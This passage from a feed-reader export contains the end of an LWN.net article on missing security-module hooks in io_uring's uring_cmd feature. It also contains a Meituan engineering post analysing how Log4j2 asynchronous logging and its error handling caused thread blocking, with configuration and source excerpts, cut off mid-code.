A year and some later, that\nidea has evolved into uring_cmd, which was pulled into the\nmainline during the 5.19 merge window.  There is a new io_uring operation\nthat, in turn, causes an invocation of the underlying device or\nfilesystem's <tt>uring_cmd()</tt> <tt>file_operations</tt> function.  The\nactual operation to be performed is passed through to that function with no\ninterpretation in the io_uring layer.  The <a href=\"https://lwn.net/ml/io-uring/20220511054750.20432-1-joshi.k@samsung.com/\">first\nuser</a> is the NVMe driver, \nwhich provides a direct passthrough operation.\n</p><p>\n</p><h4>Missing security hooks</h4>\n<p>\nJust over one year ago, there was <a href=\"https://lwn.net/Articles/858023/\">a bit of a\ndisagreement</a> after the developers of the kernels Linux Security Module\n(LSM) and auditing subsystems figured out that there were no security or\nauditing hooks in all of that new io_uring code.  That put io_uring\noperations outside the control of any security module that a given system\nmight be running and made those operations invisible to auditing.  Those\ngaps were filled in, but not before the security developers expressed their\nunhappiness about how io_uring had been designed and merged without thought\nfor LSM and audit support.\n</p><p>\nGiven that, one might expect that the addition of a new feature like\n<tt>uring_cmd</tt> would have seen more involvement from the security\ncommunity.  To an extent, that happened; Luis Chamberlain <a href=\"https://lwn.net/ml/io-uring/YiuC1fhEiRdo5bPd@bombadil.infradead.org/\">posted a\npatch</a> adding LSM support back in March.  In short, it added a new\n<tt>security_uring_async_cmd()</tt> hook that would be called before\npassing a command through to the underlying code; it could examine that\ncommand and decide whether to allow or deny the operation.  There were some\ndisagreements over how well this would work; in particular, Casey Schaufler\n<a href=\"https://lwn.net/ml/io-uring/8adf55db-7bab-f59d-d612-ed906b948d19@schaufler-ca.com/\">complained</a>\nthat security modules would have to gain an understanding of every\ndevice-specific command, which clearly would not scale well.\nThe conversation wound down shortly thereafter.\n</p><p>\nWhen the new feature was pushed\ninto the mainline, there was no LSM support included with it.  On\nJuly 13, Chamberlain <a href=\"https://lwn.net/ml/linux-block/20220714000536.2250531-1-mcgrof@kernel.org/\">reposted\nhis patch</a> adding the new security hook.  Schaufler <a href=\"https://lwn.net/ml/linux-block/30dee52c-80e7-f1d9-a2e2-018e7761b8ea@schaufler-ca.com/\">was\nequally unimpressed</a> this time around:\n</p><p>\n</p><blockquote>\n\tYou're passing the complexity of uring-cmd directly into each and\n\tevery security module. SELinux, AppArmor, Smack, BPF and every\n\tother LSM now needs to know the gory details of everything that\n\tmight be in any arbitrary subsystem so that it can make a wild\n\tguess about what to do. And I thought ioctl was hard to deal with.\n</blockquote>\n<p>\nSELinux and audit maintainer Paul Moore <a href=\"https://lwn.net/ml/linux-block/CAHC9VhSjfrMtqy_6+=_=VaCsJKbKU1oj6TKghkue9LrLzO_++w@mail.gmail.com/\">agreed</a>\nwith that assessment.  The end result, he said, was that security modules\nwould be unable to distinguish between low-level operations, so they\nwould end up simply enabling all io_uring passthrough commands for any\ngiven subsystem or none of them; \"<q>I think we can all agree that is not a\ngood idea</q>\".  He later <a href=\"https://lwn.net/ml/linux-block/CAHC9VhQMABYKRqZmJQtXai0gtiueU42ENvSUH929=pF6tP9xOg@mail.gmail.com/\">acknowledged</a>\nthat there does not appear to be a better solution at hand and merging\nChamberlain's patch looked like the only path forward: \"<q>Without any\ncooperation from the io_uring developers, that is likely what we will have\nto do</q>\".  The current plan appears to be to get Chamberlain's patch into\nthe mainline during the next merge window, with backports to the stable\nkernels to be done thereafter.\n</p><p>\n</p><h4>Grumpiness</h4>\n<p>\nThis particular problem appears to be solved, albeit in a way that is\nless than satisfying to the security community.  A better solution may\nmaterialize in the future, though providing a way to control access to\ndevice-specific functionality in a general way is a hard problem.  But a\nharder problem may be addressing the residual grumpiness in the security\ncommunity and preventing such problems from recurring in the future.  As\nMoore <a href=\"https://lwn.net/ml/linux-block/CAHC9VhRCW4PFwmwyAYxYmLUDuY-agHm1CejBZJUpHTVbZE8L1Q@mail.gmail.com/\">put\nit</a>:\n</p><p>\n</p><blockquote>\n\tI feel that expressing frustration about the LSMs being routinely\n\tleft out of the discussion when new functionality is added to the\n\tkernel is a reasonable response; especially when one considers the\n\thistory of this particular situation.\n</blockquote>\n<p>\nFor his part, Axboe <a href=\"https://lwn.net/ml/linux-block/711b10ab-4ac7-e82f-e125-658460acda89@kernel.dk/\">acknowledged</a>\nthat the security concerns should not have been allowed to fall through the\ncracks, but he didn't necessarily offer a lot of hope for changes in the\nfuture:\n</p><p>\n</p><blockquote>\n\tI guess it's just somewhat lack of interest, since most of us don't\n\thave to deal with anything that uses LSM. And then it mostly just\n\tgets in the way and adds overhead, both from a runtime and\n\tmaintainability point of view, which further reduces the\n\tmotivation.\n</blockquote>\n<p>\nEven when the motivation is there, mistakes can happen.\nKernel development is a complex business.  A lot of effort has gone into\nmaking the kernel sufficiently modular that developers need not worry about\nwhat is happening in the rest of the system, but there are limits to how\nfar that process can go.\n</p><p>\nFor example, developers must be aware of locking and the\nlocking requirements of subsystems they call into or things may go badly\nwrong.  Memory must be handled according to the constraints placed on the\nmemory-management subsystem, and developers creating complex caches may\nhave to implement shrinkers to release memory on demand.  CPU hotplug\naffects many subsystems and must be taken into account.  The same is true\nof power-management events.  Changes to the user-space API can create\nunhappiness years later.  Inattention to latency constraints may create\ntrouble in realtime applications.  A failure to properly document a\nsubsystem will make life harder for developers and users — but they are all\nused to that by now.\n</p><p>\nAnd, of course, a failure to provide proper security hooks will hobble the\nability of administrators to control process behavior by way of LSM\npolicies. \n</p><p>\nThe fact that developers do not always succeed in keeping all of these\nconstraints in mind — and consequently make mistakes — is unsurprising.\nCatching such omissions is one of the reasons for the existence of the\nkernel's sometimes tiresome review process.  But nothing ensures that\na given change will be properly reviewed by, for example, a developer who\nunderstands the needs of Linux security modules, and there is little that\nforces the suggestions from any such review to be heeded.\n</p><p>\nSo important things will occasionally fall through the cracks, and it is\nnot clear that much can be done to improve the situation.  It would be\nwonderful if more companies would pay developers to spend more time\nreviewing patches to provide, as an example, an overall security-oriented\neye on code heading into the mainline, but that does not appear to be the\nworld that we are living in.  Attempts to impose requirements with a more\nbureaucratic process would mostly create friction and lead to the\ndistribution of more out-of-tree (and severely unreviewed) code.\n</p><p>\nThe best path toward improvement may be, as Axboe <a href=\"https://lwn.net/ml/linux-block/2c6541c2-d55b-4fbc-ec03-3b84722b7264@kernel.dk/\">put\nit</a>, \"<q>one subsystem being aware of another one's needs</q>\".  Working\ntoward that goal — and the ability to fix mistakes in the stable kernels\nwhen they do happen — seems to work reasonably well most of the time.<br clear=\"all\"></p><table>\n           <tbody><tr><th colspan=\"2\">Index entries for this article</th></tr>\n           <tr><td><a href=\"https://lwn.net/Kernel/Index\">Kernel</a></td><td><a href=\"https://lwn.net/Kernel/Index#Development_model-Code_review\">Development model/Code review</a></td></tr>\n            <tr><td><a href=\"https://lwn.net/Kernel/Index\">Kernel</a></td><td><a href=\"https://lwn.net/Kernel/Index#io_uring\">io_uring</a></td></tr>\n            <tr><td><a href=\"https://lwn.net/Kernel/Index\">Kernel</a></td><td><a href=\"https://lwn.net/Kernel/Index#Security-Security_modules\">Security/Security modules</a></td></tr>\n            </tbody></table><br clear=\"all\">\n<div>\n               <table align=\"right\"><tbody><tr><td>\n               \n               \n               \n               </td></tr></tbody></table>\n               </div>\n               <br clear=\"all\">\n               <table align=\"right\"><tbody><tr><td>\n           \n           \n           </td></tr></tbody></table>\n           <br clear=\"all\">\n           <p>\n           \n</p>"
    },
    "origin": {
        "streamId": 22,
        "title": "LWN.net",
        "htmlUrl": "https://lwn.net/",
        "feedUrl": "http://lwnfeed:8080/feed.rss"
    }
},
{
    "id": "https://tech.meituan.com/2022/07/29/tips-for-avoiding-log-blocking-threads.html",
    "timestampUsec": "1659060828052213",
    "categories": [
        "user/-/state/com.google/read",
        "user/-/state/com.google/starred"
    ],
    "title": "日志导致线程Block的这些坑，你不得不防",
    "author": ";美团技术团队",
    "published": 1659052800,
    "updated": 1659052800,
    "alternate": [
        {
            "href": "https://tech.meituan.com/2022/07/29/tips-for-avoiding-log-blocking-threads.html",
            "type": "text/html"
        }
    ],
    "content": {
        "content": "<h2>1. 前言</h2><p>日志对程序的重要性不言而喻。它很“大”，我们在项目中经常通过日志来记录信息和排查问题，相关代码随处可见。它也很“小”，作为辅助工具，日志使用简单、上手快，我们通常不会花费过多精力耗在日志上。但看似不起眼的日志也隐藏着各种各样的“坑”，如果使用不当，它不仅不能帮助我们，反而还可能降低服务性能，甚至拖垮我们的服务。</p><p>日志导致线程Block的问题，相信你或许已经遇到过，对此应该深有体会；或许你还没遇到过，但不代表没有问题，只是可能还没有触发而已。本文主要介绍美团统一API网关服务Shepherd（参见<a href=\"https://mp.weixin.qq.com/s/iITqdIiHi3XGKq6u6FRVdg\">《百亿规模API网关服务Shepherd的设计与实现》</a>一文）在实践中所踩过的关于日志导致线程Block的那些“坑”，然后再分享一些避“坑”经验。</p><h2>2. 背景</h2><p>API网关服务Shepherd基于Java语言开发，使用业界大名鼎鼎的<a href=\"https://logging.apache.org/log4j/2.x/\">Apache Log4j2</a>作为主要日志框架，同时使用美团内部的XMD-Log SDK和Scribe-Log SDK对日志内容进行处理，日志处理整体流程如下图1所示。业务打印日志时，日志框架基于Logger配置来决定把日志交给XMDFile处理还是Scribe处理。其中，XMDFile是XMD-Log内部提供的日志Appender名称，负责输出日志到本地磁盘，Scribe是Scribe-Log内部提供的日志Appender名称，负责上报日志到远程日志中心。</p><p><img src=\"https://p0.meituan.net/travelcube/2e435a6e5275b41caaea13adc19f34ef45934.png\" alt=\"图1 日志处理流程示意图\" referrerpolicy=\"no-referrer\"></p><p>随着业务的快速增长，日志导致的线程Block问题愈发频繁。比如调用后端RPC服务超时，导致调用方大量线程Block；再比如，业务内部输出异常日志导致服务大量线程Block等，这些问题严重影响着服务的稳定性。因此，我们结合项目在过去一段时间暴露出来的各种由于日志导致的线程Block问题，对日志框架存在的稳定性风险因素进行了彻底的排查和修复，并在线下、线上环境进行全方位验证。在此过程中，我们总结了一些日志使用相关的实践经验，希望分享给大家。</p><p>在进入正文前，首先介绍项目当时的运行环境和日志相关配置信息。</p><ul><li><strong>JDK版本</strong></li></ul><pre><code>java version \"1.8.0_45\"\nJava(TM) SE Runtime Environment (build 1.8.0_45-b14)\nJava HotSpot(TM) 64-Bit Server VM (build 25.45-b02, mixed mode)\n</code></pre><ul><li><strong>日志依赖版本</strong></li></ul><pre><code>&lt;dependency&gt;\n    &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt;\n    &lt;artifactId&gt;log4j-api&lt;/artifactId&gt;\n    &lt;version&gt;2.7&lt;/version&gt;\n&lt;/dependency&gt;\n&lt;dependency&gt;\n    &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt;\n    &lt;artifactId&gt;log4j-core&lt;/artifactId&gt;\n    &lt;version&gt;2.7&lt;/version&gt;\n&lt;/dependency&gt;\n&lt;dependency&gt;\n    &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt;\n    &lt;artifactId&gt;log4j-slf4j-impl&lt;/artifactId&gt;\n    &lt;version&gt;2.7&lt;/version&gt;\n&lt;/dependency&gt;\n</code></pre><ul><li><strong>日志配置文件</strong></li></ul><pre><code>&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n&lt;configuration status=\"warn\"&gt;\n    &lt;appenders&gt;\n        &lt;Console name=\"Console\" target=\"SYSTEM_OUT\" follow=\"true\"&gt;\n            &lt;PatternLayout pattern=\"%d{yyyy/MM/dd HH:mm:ss.SSS} %t [%p] %c{1} (%F:%L) %msg%n\" /&gt;\n        &lt;/Console&gt;\n\n        &lt;XMDFile name=\"ShepherdLog\" fileName=\"shepherd.log\"/&gt;\n\n        &lt;!--XMDFile异步磁盘日志配置示例--&gt;\n        &lt;!--默认按天&amp;按512M文件大小切分日志，默认最多保留30个日志文件。--&gt;\n        &lt;!--注意：fileName前会自动增加文件路径，只配置文件名即可--&gt;\n        &lt;XMDFile name=\"LocalServiceLog\" fileName=\"request.log\"/&gt;\n\n        &lt;Scribe name=\"LogCenterSync\"&gt;\n            &lt;!-- 在指定日志名方面，scribeCategory 和 appkey 两者至少存在一种，且 scribeCategory 高于 appkey。--&gt;\n            &lt;!-- &lt;Property name=\"scribeCategory\"&gt;data_update_test_lc&lt;/Property&gt; --&gt;\n            &lt;LcLayout/&gt;\n        &lt;/Scribe&gt;\n        &lt;Async name=\"LogCenterAsync\" blocking=\"false\"&gt;\n            &lt;AppenderRef ref=\"LogCenterSync\"/&gt;\n        &lt;/Async&gt;\n    &lt;/appenders&gt;\n\n    &lt;loggers&gt;\n        &lt;AsyncLogger name=\"com.sankuai.shepherd\" level=\"info\" additivity=\"false\"&gt;\n            &lt;AppenderRef ref=\"ShepherdLog\" level=\"warn\"/&gt;\n            &lt;AppenderRef ref=\"LogCenterAsync\" level=\"info\"/&gt;\n        &lt;/AsyncLogger&gt;\n\n        &lt;root level=\"info\"&gt;\n            &lt;!--Console日志是同步、阻塞的，推荐只在本地调试时使用，线上将该配置去掉--&gt;\n            &lt;!--appender-ref ref=\"Console\" /--&gt;\n            &lt;appender-ref ref=\"LocalServiceLog\"/&gt;\n            &lt;appender-ref ref=\"LogCenterAsync\"/&gt;\n        &lt;/root&gt;\n    &lt;/loggers&gt;\n&lt;/configuration&gt;\n</code></pre><h2>3. 踩过的坑</h2><p>本章节主要记录项目过去一段时间，我们所遇到的一系列日志导致的线程Block问题，并逐个深入分析问题根因。</p><h3>3.1 日志队列满导致线程Block</h3><h4>3.1.1 问题现场</h4><p>收到“jvm.thread.blocked.count”告警后立刻通过监控平台查看线程监控指标，当时的线程堆栈如图2和图3所示。</p><p><img src=\"https://p0.meituan.net/travelcube/320a639179808a5ca7746ad3251336ff509524.png\" alt=\"\" referrerpolicy=\"no-referrer\"></p><p><img src=\"https://p0.meituan.net/travelcube/1a422c3e76caddc87c927bf3d53c938e611650.png\" alt=\"图2 等待锁的Blocked线程堆栈\" referrerpolicy=\"no-referrer\"></p><p><img src=\"https://p0.meituan.net/travelcube/e9f141792d12fe30cf9c2efb6d054264454549.png\" alt=\"图3 持有锁的Runnable线程堆栈\" referrerpolicy=\"no-referrer\"></p><p>从Blocked线程堆栈不难看出这跟日志打印相关，而且是INFO级别的日志，遂即登陆机器查看日志是否有异样，发现当时日志量非常大，差不多每两分钟就写满一个500MB的日志文件。</p><p>那大量输出日志和线程Block之间会有怎样的关联呢？接下来本章节将结合如下图4所示的调用链路深入分析线程Block的根因。</p><p><img src=\"https://p0.meituan.net/travelcube/606e8387ee50e3035c35df87c23a94eb113029.png\" alt=\"图4 日志调用链路\" referrerpolicy=\"no-referrer\"></p><h4>3.1.2 为什么会Block线程？</h4><p>从Blocked线程堆栈着手分析，查看PrintStream相关代码片段如下图5所示，可以看到被阻塞地方有synchronized同步调用，再结合上文发现每两分钟写满一个500MB日志文件的现象，初步怀疑是日志量过大导致了线程阻塞。</p><p><img src=\"https://p0.meituan.net/travelcube/7fd03330c8f39d30cdadf02bf57a976f92577.png\" alt=\"图5 PringStream代码片段\" referrerpolicy=\"no-referrer\"></p><p>但上述猜测仍有一些值得推敲的地方：</p><ol><li>如果仅仅因为日志量过大就导致线程Block，那日志框架也太不堪重用了，根本没法在高并发、高吞吐业务场景下使用。</li><li>日志配置里明明是输出日志到文件，怎么会输出到Console PrintStream？</li></ol><h4>3.1.3 为什么会输出到Console？</h4><p>继续沿着线程堆栈调用链路分析，可以看出是AsyncAppender调用append方法追加日志时发生了错误，相关代码片段如下：</p><pre><code>// org.apache.logging.log4j.core.appender.AsyncAppender\n\n// 内部维护的阻塞队列，队列大小默认是128\nprivate final BlockingQueue&lt;LogEvent&gt; queue;\n\n@Override\npublic void append(final LogEvent logEvent) {\n    if (!isStarted()) {\n        throw new IllegalStateException(\"AsyncAppender \" + getName() + \" is not active\");\n    }\n    if (!Constants.FORMAT_MESSAGES_IN_BACKGROUND) { // LOG4J2-898: user may choose\n        logEvent.getMessage().getFormattedMessage(); // LOG4J2-763: ask message to freeze parameters\n    }\n    final Log4jLogEvent memento = Log4jLogEvent.createMemento(logEvent, includeLocation);\n  // 日志事件转入异步队列\n    if (!transfer(memento)) {\n      // 执行到这里说明队列满了，入队失败，根据是否blocking执行具体策略\n        if (blocking) {\n          // 阻塞模式，选取特定的策略来处理，策略可能是 \"忽略日志\"、\"日志入队并阻塞\"、\"当前线程打印日志\"\n            // delegate to the event router (which may discard, enqueue and block, or log in current thread)\n            final EventRoute route = asyncQueueFullPolicy.getRoute(thread.getId(), memento.getLevel());\n            route.logMessage(this, memento);\n        } else {\n          // 非阻塞模式，交由 ErrorHandler 处理失败日志\n            error(\"Appender \" + getName() + \" is unable to write primary appenders. queue is full\");\n            logToErrorAppenderIfNecessary(false, memento);\n        }\n    }\n}\n\nprivate boolean transfer(final LogEvent memento) {\n    return queue instanceof TransferQueue\n        ? ((TransferQueue&lt;LogEvent&gt;) queue).tryTransfer(memento)\n        : queue.offer(memento);\n}\n\npublic void error(final String msg) {\n    handler.error(msg);\n}\n</code></pre><p>AsyncAppender顾名思义是个异步Appender，采用异步方式处理日志，在其内部维护了一个BlockingQueue队列，每次处理日志时，都先尝试把Log4jLogEvent事件存入队列中，然后交由后台线程从队列中取出事件并处理（把日志交由AsyncAppender所关联的Appender处理），但队列长度总是有限的，且队列默认大小是128，如果日志量过大或日志异步线程处理不及时，就很可能导致日志队列被打满。</p><p>当日志队列满时，日志框架内部提供了两种处理方式，具体如下：</p><ul><li>如果blocking配置为true，会选择相应的处理策略，默认是SYNCHRONOUS策略，可以在log4j2.component.properties文件中，通过log4j2.AsyncQueueFullPolicy参数配置日志框架提供的其他策略或自定义策略。<ul><li><strong>DISCARD策略</strong>，直接忽略日志。</li><li><strong>SYNCHRONOUS策略</strong>，当前线程直接发送日志到Appender。</li><li><strong>ENQUEUE策略</strong>，强制阻塞入队。</li></ul></li><li>如果blocking配置为false，则由ErrorHandler和ErrorAppender处理失败日志。日志框架提供了默认的ErrorHandler实现，即DefaultErrorHandler，目前暂不支持业务在XML、JSON等日志配置文件里自定义ErrorHandler。日志框架默认不提供ErrorAppender，业务如有需要可在XML、JSON等日志配置文件里自定义error-ref配置。</li></ul><p>在本项目的日志配置文件中可以看到，AsyncAppender设置了blocking为false，且没有配置error-ref，下面具体分析DefaultErrorHandler。</p><pre><code>// org.apache.logging.log4j.core.appender.DefaultErrorHandler\n\nprivate static final Logger LOGGER = StatusLogger.getLogger();\n\nprivate static final int MAX_EXCEPTIONS = 3;\n\n// 5min 时间间隔\nprivate static final long EXCEPTION_INTERVAL = TimeUnit.MINUTES.toNanos(5);\n\nprivate int exceptionCount = 0;\n\nprivate long lastException = System.nanoTime() - EXCEPTION_INTERVAL - 1;\n\npublic void error(final String msg) {\n    final long current = System.nanoTime();\n  // 当前时间距离上次异常处理时间间隔超过5min 或者异常处理数小于3次\n    if (current - lastException &gt; EXCEPTION_INTERVAL || exceptionCount++ &lt; MAX_EXCEPTIONS) {\n      // StatusLogger 负责处理\n        LOGGER.error(msg);\n    }\n    lastException = current;\n}\n</code></pre><p>DefaultErrorHandler内部在处理异常日志时增加了条件限制，只有下述<strong>两个条件任一满足</strong>时才会处理，从而避免大量异常日志导致的性能问题。</p><ul><li><strong>两条日志处理间隔超过5min。</strong></li><li><strong>异常日志数量不超过3次。</strong></li></ul><p>但项目所用日志框架版本的默认实现看起来存在一些不太合理的地方：</p><ul><li>lastException用于标记上次异常的时间戳，该变量可能被多线程访问，<strong>无法保证多线程情况下的线程安全。</strong></li><li>exceptionCount用于统计异常日志次数，该变量可能被多线程访问，<strong>无法保证多线程情况下的线程安全。</strong></li></ul><p>所以，在多线程场景下，可能有大量异常日志同时被DefaultErrorHandler处理，带来线程安全问题。值得一提的是，该问题已有相关<a href=\"https://issues.apache.org/jira/browse/LOG4J2-3185\">Issue: DefaultErrorHandler can not share values across threads</a>反馈给社区，并在<a href=\"https://logging.apache.org/log4j/2.x/changes-report.html#a2.15.0\">2.15.0</a>版本中进行了修复。</p><p>从上述DefaultErrorHandler代码中可以看到，真正负责处理日志的是StatusLogger，继续跟进代码进入logMessage方法，方法执行逻辑如下：</p><ul><li>如果StatusLogger内部注册了StatusListener，则由对应的StatusListener负责处理日志。</li><li>否则由SimpleLogger负责处理日志，直接输出日志到System.err输出流。</li></ul><pre><code>// org.apache.logging.log4j.status.StatusLogger\n\nprivate static final StatusLogger STATUS_LOGGER = new StatusLogger(StatusLogger.class.getName(),\n            ParameterizedNoReferenceMessageFactory.INSTANCE);\n\n// StatusListener\nprivate final Collection&lt;StatusListener&gt; listeners = new CopyOnWriteArrayList&lt;&gt;();\n\nprivate final SimpleLogger logger;\n\nprivate StatusLogger(final String name, final MessageFactory messageFactory) {\n    super(name, messageFactory);\n    this.logger = new SimpleLogger(\"StatusLogger\", Level.ERROR, false, true, false, false, Strings.EMPTY,\n            messageFactory, PROPS, System.err);\n    this.listenersLevel = Level.toLevel(DEFAULT_STATUS_LEVEL, Level.WARN).intLevel();\n}\n\n/**\n * Retrieve the StatusLogger.\n *\n * @return The StatusLogger.\n */\npublic static StatusLogger getLogger() {\n    return STATUS_LOGGER;\n}\n\n@Override\npublic void logMessage(final String fqcn, final Level level, final Marker marker, final Message msg,\n        final Throwable t) {\n    StackTraceElement element = null;\n    if (fqcn != null) {\n        element = getStackTraceElement(fqcn, Thread.currentThread().getStackTrace());\n    }\n    final StatusData data = new StatusData(element, level, msg, t, null);\n    msgLock.lock();\n    try {\n        messages.add(data);\n    } finally {\n        msgLock.unlock();\n    }\n  \n    if (listeners.size() &gt; 0) {\n      // 如果系统注册了 listener，由 StatusConsoleListener 处理日志\n        for (final StatusListener listener : listeners) {\n            if (data.getLevel().isMoreSpecificThan(listener.getStatusLevel())) {\n                listener.log(data);\n            }\n        }\n    } else {\n      // 否则由 SimpleLogger 处理日志，直接输出到 System.err\n        logger.logMessage(fqcn, level, marker, msg, t);\n    }\n}\n</code></pre><p>从上述Blocked线程堆栈来看，是StatusConsoleListener负责处理日志，而StatusConsoleListener是StatusListener接口的实现类，那么StatusConsoleListener是如何被创建的？</p><h4>3.1.4 StatusConsoleListener是怎么来的？</h4><p>通常来说，每个项目都会有一个日志配置文件（如log4j2.xml），该配置对应Log4j2日志框架中的Configuration接口，不同的日志配置文件格式有不同的实现类：</p><ul><li>XmlConfiguration，即XML格式日志配置</li><li>JsonConfiguration，即JSON格式日志配置</li><li>XMDConfiguration，即美团内部日志组件XMD-Log定义的日志配置（XML格式）</li><li>……</li></ul><p>log4j2.xml 示例配置（仅做示例，请勿实际项目中使用该配置）。</p><pre><code>&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n&lt;Configuration status=\"debug\" name=\"RoutingTest\"&gt;\n  &lt;Properties&gt;\n    &lt;Property name=\"filename\"&gt;target/rolling1/rollingtest-$${sd:type}.log&lt;/Property&gt;\n  &lt;/Properties&gt;\n  &lt;ThresholdFilter level=\"debug\"/&gt;\n \n  &lt;Appenders&gt;\n    &lt;Console name=\"STDOUT\"&gt;\n      &lt;PatternLayout pattern=\"%m%n\"/&gt;\n      &lt;ThresholdFilter level=\"debug\"/&gt;\n    &lt;/Console&gt;\n    &lt;Routing name=\"Routing\"&gt;\n      &lt;Routes pattern=\"$${sd:type}\"&gt;\n        &lt;Route&gt;\n          &lt;RollingFile name=\"Rolling-${sd:type}\" fileName=\"${filename}\"\n                       filePattern=\"target/rolling1/test1-${sd:type}.%i.log.gz\"&gt;\n            &lt;PatternLayout&gt;\n              &lt;pattern&gt;%d %p %c{1.} [%t] %m%n&lt;/pattern&gt;\n            &lt;/PatternLayout&gt;\n            &lt;SizeBasedTriggeringPolicy size=\"500\" /&gt;\n          &lt;/RollingFile&gt;\n        &lt;/Route&gt;\n        &lt;Route ref=\"STDOUT\" key=\"Audit\"/&gt;\n      &lt;/Routes&gt;\n    &lt;/Routing&gt;\n  &lt;/Appenders&gt;\n \n  &lt;Loggers&gt;\n    &lt;Logger name=\"EventLogger\" level=\"info\" additivity=\"false\"&gt;\n      &lt;AppenderRef ref=\"Routing\"/&gt;\n    &lt;/Logger&gt;\n \n    &lt;Root level=\"error\"&gt;\n      &lt;AppenderRef ref=\"STDOUT\"/&gt;\n    &lt;/Root&gt;\n  &lt;/Loggers&gt;\n&lt;/Configuration&gt;\n</code></pre><p>Log4j2在启动时会加载并解析log4j2.xml配置文件，由对应的ConfigurationFactory创建具体Configuration实例。</p><pre><code>// org.apache.logging.log4j.core.config.xml.XmlConfiguration\n\npublic XmlConfiguration(final LoggerContext loggerContext, final ConfigurationSource configSource) {\n    super(loggerContext, configSource);\n    final File configFile = configSource.getFile();\n    byte[] buffer = null;\n\n    try {\n        final InputStream configStream = configSource.getInputStream();\n        try {\n            buffer = toByteArray(configStream);\n        } finally {\n            Closer.closeSilently(configStream);\n        }\n        final InputSource source = new InputSource(new ByteArrayInputStream(buffer));\n        source.setSystemId(configSource.getLocation());\n        final DocumentBuilder documentBuilder = newDocumentBuilder(true);\n        Document document;\n        try {\n          // 解析 xml 配置文件\n            document = documentBuilder.parse(source);\n        } catch (final Exception e) {\n            // LOG4J2-1127\n            final Throwable throwable = Throwables.getRootCause(e);\n            if (throwable instanceof UnsupportedOperationException) {\n                LOGGER.warn(\n                        \"The DocumentBuilder {} does not support an operation: {}.\"\n                        + \"Trying again without XInclude...\",\n                        documentBuilder, e);\n                document = newDocumentBuilder(false).parse(source);\n            } else {\n                throw e;\n            }\n        }\n        rootElement = document.getDocumentElement();\n      // 处理根节点属性配置，即 &lt;Configuration&gt;&lt;/Configuration&gt; 节点\n        final Map&lt;String, String&gt; attrs = processAttributes(rootNode, rootElement);\n      // 创建 StatusConfiguration\n        final StatusConfiguration statusConfig = new StatusConfiguration().withVerboseClasses(VERBOSE_CLASSES)\n                .withStatus(getDefaultStatus());\n        for (final Map.Entry&lt;String, String&gt; entry : attrs.entrySet()) {\n            final String key = entry.getKey();\n            final String value = getStrSubstitutor().replace(entry.getValue());\n          // 根据配置文件中的 status 属性值，来设置 StatusConfiguration 的 status level\n            if (\"status\".equalsIgnoreCase(key)) {\n                statusConfig.withStatus(value);\n            // 根据配置文件中的 dest 属性值，来设置 StatusConfiguration 的日志输出 destination\n            } else if (\"dest\".equalsIgnoreCase(key)) {\n                statusConfig.withDestination(value);\n            } else if (\"shutdownHook\".equalsIgnoreCase(key)) {\n                isShutdownHookEnabled = !\"disable\".equalsIgnoreCase(value);\n            } else if (\"verbose\".equalsIgnoreCase(key)) {\n                statusConfig.withVerbosity(value);\n            } else if (\"packages\".equalsIgnoreCase(key)) {\n                pluginPackages.addAll(Arrays.asList(value.split(Patterns.COMMA_SEPARATOR)));\n            } else if (\"name\".equalsIgnoreCase(key)) {\n                setName(value);\n            } else if (\"strict\".equalsIgnoreCase(key)) {\n                strict = Boolean.parseBoolean(value);\n            } else if (\"schema\".equalsIgnoreCase(key)) {\n                schemaResource = value;\n            } else if (\"monitorInterval\".equalsIgnoreCase(key)) {\n                final int intervalSeconds = Integer.parseInt(value);\n                if (intervalSeconds &gt; 0) {\n                    getWatchManager().setIntervalSeconds(intervalSeconds);\n                    if (configFile != null) {\n                        final FileWatcher watcher = new ConfiguratonFileWatcher(this, listeners);\n                        getWatchManager().watchFile(configFile, watcher);\n                    }\n                }\n            } else if (\"advertiser\".equalsIgnoreCase(key)) {\n                createAdvertiser(value, configSource, buffer, \"text/xml\");\n            }\n        }\n      \n     // 初始化 StatusConfiguration\n        statusConfig.initialize();\n    } catch (final SAXException | IOException | ParserConfigurationException e) {\n        LOGGER.error(\"Error parsing \" + configSource.getLocation(), e);\n    }\n\n    if (getName() == null) {\n        setName(configSource.getLocation());\n    }\n  \n  // 忽略以下内容\n}\n</code></pre><pre><code>// org.apache.logging.log4j.core.config.status.StatusConfiguration\n\nprivate static final PrintStream DEFAULT_STREAM = System.out;\nprivate static final Level DEFAULT_STATUS = Level.ERROR;\nprivate static final Verbosity DEFAULT_VERBOSITY = Verbosity.QUIET;\n\nprivate final Collection&lt;String&gt; errorMessages = Collections.synchronizedCollection(new LinkedList&lt;String&gt;());\n// StatusLogger\nprivate final StatusLogger logger = StatusLogger.getLogger();\n\nprivate volatile boolean initialized = false;\n\nprivate PrintStream destination = DEFAULT_STREAM;\nprivate Level status = DEFAULT_STATUS;\nprivate Verbosity verbosity = DEFAULT_VERBOSITY;\n\npublic void initialize() {\n    if (!this.initialized) {\n        if (this.status == Level.OFF) {\n            this.initialized = true;\n        } else {\n            final boolean configured = configureExistingStatusConsoleListener();\n            if (!configured) {\n              // 注册新 StatusConsoleListener\n                registerNewStatusConsoleListener();\n            }\n            migrateSavedLogMessages();\n        }\n    }\n}\n\nprivate boolean configureExistingStatusConsoleListener() {\n    boolean configured = false;\n    for (final StatusListener statusListener : this.logger.getListeners()) {\n        if (statusListener instanceof StatusConsoleListener) {\n            final StatusConsoleListener listener = (StatusConsoleListener) statusListener;\n          // StatusConsoleListener 的 level 以 StatusConfiguration 的 status 为准\n            listener.setLevel(this.status);\n            this.logger.updateListenerLevel(this.status);\n            if (this.verbosity == Verbosity.QUIET) {\n                listener.setFilters(this.verboseClasses);\n            }\n            configured = true;\n        }\n    }\n    return configured;\n}\n\n\nprivate void registerNewStatusConsoleListener() {\n  // 创建 StatusConsoleListener，级别以 StatusConfiguration 为准\n  // 默认 status 是 DEFAULT_STATUS 即 ERROR\n  // 默认 destination 是 DEFAULT_STREAM 即 System.out\n    final StatusConsoleListener listener = new StatusConsoleListener(this.status, this.destination);\n    if (this.verbosity == Verbosity.QUIET) {\n        listener.setFilters(this.verboseClasses);\n    }\n    this.logger.registerListener(listener);\n}\n</code></pre><pre><code>// org.apache.logging.log4j.status.StatusConsoleListener\n\nprivate Level level = Level.FATAL; // 级别\nprivate String[] filters;\nprivate final PrintStream stream; // 输出流\n\npublic 